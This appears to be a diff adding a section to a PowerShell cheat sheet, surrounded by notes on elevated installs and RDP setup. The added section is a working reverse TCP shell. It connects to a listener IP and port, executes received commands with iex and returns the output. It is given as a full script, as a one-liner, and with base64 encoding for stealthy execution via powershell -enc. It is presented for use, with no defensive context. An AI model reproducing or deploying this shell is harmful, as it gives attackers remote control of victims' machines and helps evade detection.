@@ -98,6 +98,41 @@ Start-Process .\mytool.exe -Verb RunAs
  *with silent or install flag
 Start-Process -FilePath "C:\temp\installer.exe" -ArgumentList "/silent", "/norestart" -Verb RunAs
 
+16. Reverse TCP Shell
+# PowerShell Reverse TCP Shell
+# Replace $attacker_ip and $attacker_port with your listener's IP and port
+
+$attacker_ip = "192.168.1.100"  # Change this to your IP
+$attacker_port = 4444           # Change this to your port
+
+$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+
+ *Save the script as reverse_shell.ps1
+
+16.2 One liner
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+16.3 Encode
+$command = '$client = New-Object System.Net.Sockets.TCPClient(''192.168.1.100'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+$encodedCommand
+
+16.3.1 Execute
+powershell -enc theencodedscript
+
 #RDP
 1. Define the user and the password directly
 $UserName = "RDP_User"
